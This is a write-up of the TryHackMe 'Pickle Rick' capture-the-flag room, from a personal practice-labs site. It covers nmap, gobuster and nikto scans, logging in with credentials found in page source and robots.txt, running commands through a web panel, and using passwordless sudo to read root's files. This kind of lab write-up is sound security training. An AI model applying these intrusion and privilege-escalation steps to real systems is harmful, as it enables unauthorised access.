---
layout: page
title: Pickle Rick CTF
parent: tryhackme
grand_parent: Practice Labs
---
# {{ page.title }}
{: .no_toc }

<details open markdown="block">
  <summary>
    Table of contents
  </summary>
  {: .text-delta }
- TOC
{:toc}
</details>

---
link: https://tryhackme.com/room/picklerick

Difficulty: Easy

## Recon
Have to answer 3 questions:
- What is the first ingredient that Rick needs?
- What is the second ingredient in Rick’s potion?
- What is the last and final ingredient?

There is a hint hidden in the source code of the main webpage: `Username: R1ckRul3s`
## Scanning
What services are running on the target?
`nmap -sCV -v -oN tcp <IP>`
- Scan for service versions & default scripts, with verbose, output to file `tcp`

| Port   | Service               | Version       | Description                                        |
| ------ | --------------------- | ------------- | -------------------------------------------------- |
| 80/tcp | Apache httpd (Ubuntu) | 2.4.18        | Apache web server supporting GET HEAD POST OPTIONS |
| 22/tcp | ssh                   | OpenSSH 7.2p2 | SSH                                                |

What can we find out about the ssh running?
`nmap -sV --script="ssh*" -oN ssh-scripts-results <IP>`
- Only publickey auth is allowed

Running `gobuster` revealed:
```
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/assets (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
```

- The assets directory just shows the images & bootstrap & JQuery js files
- The robots.txt contains the string: `Wubbalubbadubdub`

Running `nikto -h <IP>` revealed the existence of a `/login.php`

## Exploitation
Navigating to `/login.php` and entering the credentials we have found:
```
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

We are entered into a command panel. The command panel seems to use bash.

`ls` in the command panel gives:
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

navigating to those files reveals the first ingredient.

Realising we can navigate up with `ls` we now have access to freely explore the file system.

Running `uname -a` give us some system details:
`Linux ip-10-10-224-157 4.4.0-1072-aws #82-Ubuntu SMP Fri Nov 2 15:00:21 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux`

Searching in the `/home/rick` dir we find the second ingredient in a file that can be dumped with  the `less` as `cat` is disabled.

`cd ../../../; ls -al; pwd`

`less /etc/*-release`
```
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.5 LTS"
NAME="Ubuntu"
VERSION="16.04.5 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.5 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

Useful command to search for all files in home dir: `ls -alhR /home`

doing a `sudo -l` its revealed we can run any command without the requirement of a password:
```
Matching Defaults entries for www-data on ip-10-10-224-157.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-224-157.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

running an `sudo ls -alhR /root` reveals the final key in `/root/3rd.txt`